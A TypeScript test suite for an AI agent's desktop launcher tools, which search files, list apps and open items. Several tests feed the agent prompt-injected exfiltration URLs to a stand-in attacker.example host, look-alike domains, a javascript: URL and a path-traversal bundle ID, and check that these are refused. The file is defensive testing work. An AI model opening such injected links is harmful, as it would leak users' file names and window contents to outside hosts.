import assert from "node:assert/strict";
import { readFile } from "node:fs/promises";
import { test } from "node:test";
import type { ExtensionAPI } from "@earendil-works/pi-coding-agent";
import {
  createLauncherToolsExtension, INSTANT_TOOL_NAMES, LAUNCHER_READ_TOOL_NAMES, LAUNCHER_TOOL_NAMES, type FileRefLedger, type InstantToolEngines, type LauncherToolDeps,
} from "../src/agent/launcherTools.js";
import type { FileCandidate } from "../src/contracts/launcher.js";

const fixture = async (name: string) => JSON.parse(await readFile(new URL(`../../shared/fixtures/launcher/${name}`, import.meta.url), "utf8"));
const searchResponse = await fixture("search-files-response.json");
const appsResponse = await fixture("list-apps-response.json");
const openRequest = await fixture("open-request.json");
const openResponse = await fixture("open-response.json");
const openDenied = await fixture("open-response-denied.json");

const engines: InstantToolEngines = {
  calc: (expression) => expression === "1/0" ? { ok: false, error: "division by zero" } : { ok: true, text: "4", approximate: false },
  convertCurrency: (amount, from, to) => from === "XXX" ? null : { value: amount * 0.9213, asOf: "2026-10-01", freshness: "fresh" },
  timeIn: (place) => place === "Narnia" ? null : { place: "Tokyo", zone: "Asia/Tokyo", time: "03:15", weekday: "Saturday", offset: "UTC+09:00", dayDelta: 1 },
};

/** Test ledger: refs f1, f2, … for host tokens; nothing else resolves. */
function ledger(): FileRefLedger & { entries: Map<string, FileCandidate> } {
  const entries = new Map<string, FileCandidate>();
  return {
    entries,
    register(candidate) { const ref = `f${entries.size + 1}`; entries.set(ref, candidate); return ref; },
    token(ref) { return entries.get(ref)?.token; },
  };
}

function setup(overrides: Partial<LauncherToolDeps> = {}, respond: (route: string, args: any) => any = () => ({ ok: true, result: {} })) {
  const calls: { route: string; args: any; signal?: AbortSignal }[] = [];
  const files = ledger();
  const deps: LauncherToolDeps = {
    engines, ledger: files, readOnly: false, contextId: "ctx-3f2a", homeDir: "/Users/fixture", now: () => Date.UTC(2026, 2, 25),
    host: { invokeTool: (async (route: string, args: any, signal?: AbortSignal) => { calls.push({ route, args, signal }); return respond(route, args); }) as any },
    ...overrides,
  };
  const tools = new Map<string, any>();
  createLauncherToolsExtension(deps).factory({ registerTool: (tool: any) => tools.set(tool.name, tool) } as unknown as ExtensionAPI);
  const run = (name: string, params: object, signal?: AbortSignal) => tools.get(name).execute("call-1", params, signal, undefined, {});
  return { tools, calls, files, run };
}

const modelVisible = (result: any) => JSON.stringify([result.content, result.structuredContent]);

test("launcher tools: read tools are direct with output schemas; open_item is a model-only sequential effect", () => {
  const { tools } = setup();
  assert.deepEqual([...tools.keys()], [...LAUNCHER_TOOL_NAMES]);
  for (const name of LAUNCHER_READ_TOOL_NAMES) {
    const tool = tools.get(name);
    assert.equal(tool.exposure ?? "direct", "direct", name);
    assert.ok(tool.outputSchema, name);
    assert.equal(tool.annotations.readOnlyHint, true, name);
  }
  const open = tools.get("open_item");
  assert.equal(open.exposure, "model-only");
  assert.equal(open.executionMode, "sequential");
  assert.equal(open.annotations.destructiveHint, false);
  assert.deepEqual(open.parameters.properties.action.enum, ["openApp", "openURL", "openFile", "revealFile"]);
  assert(!JSON.stringify(open.parameters).includes("token"));
});

test("without host launcher routes (Windows) only the engine tools register", () => {
  const tools = new Map<string, any>();
  createLauncherToolsExtension({ engines, readOnly: false }).factory({ registerTool: (tool: any) => tools.set(tool.name, tool) } as unknown as ExtensionAPI);
  assert.deepEqual([...tools.keys()], [...INSTANT_TOOL_NAMES]);
});

test("instant engine tools return structured content for scripts and readable text for the model", async () => {
  const { run } = setup();
  const calc = await run("instant_calc", { expression: "2+2" });
  assert.deepEqual(calc.structuredContent, { ok: true, value: "4", approximate: false });
  assert.equal(calc.content[0].text, "2+2 = 4");
  const failed = await run("instant_calc", { expression: "1/0" });
  assert.equal(failed.isError, true);
  assert.deepEqual(failed.structuredContent, { ok: false, error: "division by zero" });

  const fx = await run("instant_convert_currency", { amount: 120, from: "usd", to: "eur" });
  assert.equal(fx.structuredContent.value, 120 * 0.9213);
  assert.deepEqual({ ...fx.structuredContent, value: 0 }, { ok: true, amount: 120, from: "USD", to: "EUR", value: 0, asOf: "2026-10-01", freshness: "fresh" });
  assert.match(fx.content[0].text, /^120 USD = 110\.56 EUR \(ECB reference rate 2026-10-01, fresh; information only\)$/);
  const noRate = await run("instant_convert_currency", { amount: 1, from: "XXX", to: "EUR" });
  assert.equal(noRate.isError, true); assert.equal(noRate.structuredContent.error, "no_rate");

  const time = await run("instant_time_in", { place: "tokio" });
  assert.equal(time.content[0].text, "Tokyo (Asia/Tokyo): 03:15, Saturday, tomorrow, UTC+09:00");
  assert.equal(time.structuredContent.timeZone, "Asia/Tokyo");
  assert.equal((await run("instant_time_in", { place: "Narnia" })).structuredContent.error, "unknown_place");
});

test("engine failures become error results without echoing engine messages; aborts stay aborts", async () => {
  const throwing: InstantToolEngines = {
    calc: () => { throw new Error("internal detail /Users/fixture/secret"); },
    convertCurrency: async () => { throw new Error("network"); },
    timeIn: () => null,
  };
  const { run } = setup({ engines: throwing });
  const calc = await run("instant_calc", { expression: "2+2" });
  assert.equal(calc.isError, true);
  assert.doesNotMatch(modelVisible(calc), /internal detail|Users/);
  assert.equal((await run("instant_convert_currency", { amount: 1, from: "USD", to: "EUR" })).structuredContent.error, "no_rate");
  const controller = new AbortController(); controller.abort();
  const aborting: InstantToolEngines = { ...throwing, calc: (_e, signal) => { signal?.throwIfAborted(); return { ok: true, text: "1" }; } };
  await assert.rejects(setup({ engines: aborting }).run("instant_calc", { expression: "1" }, controller.signal));
});

test("find_files sends the host contract and returns names, kinds, coarse locations and ledger refs only", async () => {
  const { run, calls, files } = setup({}, () => searchResponse);
  const controller = new AbortController();
  const result = await run("find_files", { nameGroups: [["invoice"], ["rechnung"]], kind: "pdf" }, controller.signal);
  assert.deepEqual(calls.map(c => c.route), ["launcher.searchFiles"]);
  assert.deepEqual(calls[0]!.args, { nameGroups: [["invoice"], ["rechnung"]], contentType: "com.adobe.pdf", maxResults: 40, contextId: "ctx-3f2a" });
  assert.equal(calls[0]!.signal, controller.signal);
  // Most recently used/modified first; refs come from the injected ledger.
  assert.deepEqual(result.structuredContent.items, [
    { ref: "f1", name: "Invoice-2026-03.pdf", kind: "pdf", location: "Documents", modified: "2026-03-14" },
    { ref: "f2", name: "Rechnung_März_Telekom.pdf", kind: "pdf", location: "Documents", modified: "2026-03-20" },
    { ref: "f3", name: "invoice_march_acme.pdf", kind: "pdf", location: "Downloads", modified: "2026-03-02" },
  ]);
  assert.equal(files.token("f2"), "tok_51d0e3b8a6c7");
  const visible = modelVisible(result);
  for (const secret of ["tok_", "/Users/", "Finance", "fixture"]) assert(!visible.includes(secret), secret);
  assert.match(result.content[0].text, /^3 of 3 matching item\(s\):\nf1  Invoice-2026-03\.pdf — pdf, Documents, modified 2026-03-14/);

  const recent = await setup({}, () => searchResponse).run("find_files", { nameGroups: [["invoice"]], modifiedWithinDays: 7, limit: 5 });
  assert.deepEqual(recent.structuredContent.items.map((i: any) => i.name), ["Rechnung_März_Telekom.pdf"]);
  const empty = await setup({}, () => ({ ok: true, result: { items: [{ name: "no token" }], truncated: false, elapsedMs: 1 } })).run("find_files", { nameGroups: [["x"]] });
  assert.equal(empty.content[0].text, "No matching files.");
});

test("find_files leaves out candidates the ledger refuses instead of showing an unusable ref", async () => {
  const picky: FileRefLedger = { register: (c) => c.name.startsWith("Rechnung") ? undefined : `f${c.name.length}`, token: () => undefined };
  const result = await setup({ ledger: picky }, () => searchResponse).run("find_files", { nameGroups: [["invoice"]] });
  assert.deepEqual(result.structuredContent.items.map((i: any) => i.name), ["Invoice-2026-03.pdf", "invoice_march_acme.pdf"]);
  assert(result.structuredContent.items.every((i: any) => /^f\d+$/.test(i.ref)));
  assert.doesNotMatch(result.content[0].text, /Rechnung/);
});

test("find_files rejects oversized queries before the host and surfaces host refusals", async () => {
  const { run, calls } = setup({}, () => ({ ok: false, error: { code: "permission_denied", message: "Spotlight unavailable" } }));
  const tooMany = await run("find_files", { nameGroups: [["a", "b", "c"], ["d", "e", "f"], ["g"]] });
  assert.equal(tooMany.isError, true); assert.equal(calls.length, 0);
  await assert.rejects(run("find_files", { nameGroups: [["invoice"]] }), /permission_denied: Spotlight unavailable/);
});

test("list_apps filters names and aliases (case and accent insensitive) without exposing app paths", async () => {
  const { run, calls } = setup({}, () => appsResponse);
  const result = await run("list_apps", { query: "RECHNER" });
  assert.deepEqual(calls[0]!.args, { contextId: "ctx-3f2a" });
  assert.deepEqual(result.structuredContent, { ok: true, apps: [{ name: "Calculator", bundleId: "com.apple.calculator", running: false }], total: 1 });
  const all = await run("list_apps", {});
  assert.equal(all.structuredContent.total, 4);
  assert.match(all.content[0].text, /Visual Studio Code \(com\.microsoft\.VSCode\) — running/);
  assert(!modelVisible(all).includes("/Applications"));
});

test("open_item refuses in read-only mode before any host call", async () => {
  const { run, calls } = setup({ readOnly: true }, () => openResponse);
  await assert.rejects(run("open_item", { action: "openApp", bundleId: "com.figma.Desktop" }), /^Error: control_disabled/);
  assert.equal(calls.length, 0);
});

test("open_item opens apps and URLs through launcher.open and files only by a ledger ref", async () => {
  const { run, calls, files } = setup({ userRequests: () => ["open the example.com docs"] }, (route) => route === "launcher.searchFiles" ? searchResponse : openResponse);
  const opened = await run("open_item", { action: "openApp", bundleId: "com.figma.Desktop" });
  assert.deepEqual({ arguments: calls[0]!.args }, openRequest);
  assert.equal(opened.content[0].text, "Opened Figma");

  await run("open_item", { action: "openURL", url: "https://example.com/docs" });
  assert.deepEqual(calls[1]!.args.action, { type: "openURL", url: "https://example.com/docs" });
  await assert.rejects(run("open_item", { action: "openURL", url: "javascript:alert(1)" }), /invalid_arguments/);
  await assert.rejects(run("open_item", { action: "openApp", bundleId: "../../etc" }), /invalid_arguments/);

  await run("find_files", { nameGroups: [["invoice"]] });
  await run("open_item", { action: "revealFile", ref: "f3" });
  assert.deepEqual(calls.at(-1)!.args, { contextId: "ctx-3f2a", action: { type: "revealFile", token: files.token("f3") } });
  // A token or path from the model never resolves, even a real one.
  for (const ref of ["tok_3fa8c2d1e9b0", "/Users/fixture/Downloads/invoice_march_acme.pdf", "f9", undefined]) {
    await assert.rejects(run("open_item", { action: "openFile", ...(ref ? { ref } : {}) }), /unknown_ref/);
  }
  assert.equal(calls.filter(c => c.route === "launcher.open").length, 3);
});

test("open_item opens a URL directly only when the user's own words named its site; anything else becomes a link", async () => {
  const opened = (calls: { route: string }[]) => calls.filter(call => call.route === "launcher.open").length;
  // (b) An injected exfiltration link: no host call, a non-error result asking for a user click.
  let requests: string[] = ["summarize the page in my browser"];
  const { run, calls } = setup({ userRequests: () => requests }, () => openResponse);
  const exfil = await run("open_item", { action: "openURL", url: "https://attacker.example/c?d=window-title-and-file-names" });
  assert.equal(opened(calls), 0);
  assert.notEqual(exfil.isError, true);
  assert.match(exfil.content[0].text, /^not_opened: .*show_result openURL/);
  assert.deepEqual(exfil.details, { ok: false, reason: "user_click_required" });
  // Subdomains and look-alikes of a named site do not count (they can carry data too).
  requests = ["open github.com"];
  for (const url of ["https://github.com.attacker.example/", "https://data.github.com/x", "https://attacker.example/github.com"]) {
    await run("open_item", { action: "openURL", url });
  }
  assert.equal(opened(calls), 0);
  // www and the bare domain are the same site; http and https on the default port both count.
  for (const url of ["https://github.com/", "https://www.github.com/pi", "http://github.com/x?q=1"]) await run("open_item", { action: "openURL", url });
  assert.equal(opened(calls), 3);
  assert.equal(opened(calls.filter(call => call.route === "launcher.open")), 3);
  // A bare host never allows another port.
  await run("open_item", { action: "openURL", url: "https://github.com:8443/" });
  assert.equal(opened(calls), 3);
});

test("open_item: the desktop context never authorizes a URL; private hosts need their exact host:port in the request", async () => {
  // (c) Only the raw requests count: a window title or page text is not passed in here at all.
  const { run, calls } = setup({ userRequests: () => ["what does this page say"] }, () => openResponse);
  await run("open_item", { action: "openURL", url: "https://attacker.example/" });
  assert.equal(calls.length, 0);
  // (d) Loopback, LAN and .local hosts are refused unless named exactly.
  for (const url of ["http://127.0.0.1:8080/x", "http://192.168.1.1/", "http://printer.local/", "http://localhost:3000/"]) {
    await run("open_item", { action: "openURL", url });
  }
  assert.equal(calls.length, 0);
  const local = setup({ userRequests: () => ["open localhost:3000"] }, () => openResponse);
  await local.run("open_item", { action: "openURL", url: "http://localhost:3000/" });
  assert.equal(local.calls.length, 1);
  for (const url of ["http://localhost:8080/", "http://localhost/", "http://127.0.0.1:3000/"]) await local.run("open_item", { action: "openURL", url });
  assert.equal(local.calls.length, 1, "only the exact host:port the user named");
});

test("open_item: spoken URLs, known site names and follow-up turns add allowed sites; apps and files are unaffected", async () => {
  const requests = ["open github dot com"];
  const { run, calls, files } = setup({ userRequests: () => requests }, (route) => route === "launcher.searchFiles" ? searchResponse : openResponse);
  // (e) The spoken-URL normalizer applies ("github dot com" → github.com).
  await run("open_item", { action: "openURL", url: "https://github.com/" });
  assert.equal(calls.length, 1);
  // Known site names ("search youtube for …") stand for their hosts.
  await run("open_item", { action: "openURL", url: "https://www.youtube.com/results?search_query=lofi" });
  assert.equal(calls.length, 1);
  // (f) A follow-up turn's request adds its origins.
  requests.push("now play lofi beats on youtube");
  await run("open_item", { action: "openURL", url: "https://www.youtube.com/results?search_query=lofi" });
  assert.equal(calls.length, 2);
  // (g) Apps and ref-based file opens never depend on the request text.
  await run("open_item", { action: "openApp", bundleId: "com.figma.Desktop" });
  await run("find_files", { nameGroups: [["invoice"]] });
  await run("open_item", { action: "revealFile", ref: "f1" });
  assert.deepEqual(calls.filter(call => call.route === "launcher.open").map(call => call.args.action.type), ["openURL", "openURL", "openApp", "revealFile"]);
  assert.ok(files.token("f1"));
});

test("open_item surfaces host policy refusals and the executable downgrade to Reveal", async () => {
  const denied = setup({ userRequests: () => ["open example.com"] }, () => openDenied);
  await assert.rejects(denied.run("open_item", { action: "openURL", url: "http://example.com" }), /policy_blocked: Only http and https links can be opened\./);
  const downgraded = setup({}, (route) => route === "launcher.searchFiles" ? searchResponse : { ok: true, result: { status: "Revealed installer.pkg", performed: "revealFile" } });
  await downgraded.run("find_files", { nameGroups: [["invoice"]] });
  const result = await downgraded.run("open_item", { action: "openFile", ref: "f1" });
  assert.match(result.content[0].text, /^Revealed installer\.pkg \(revealed in Finder instead of opened/);
});
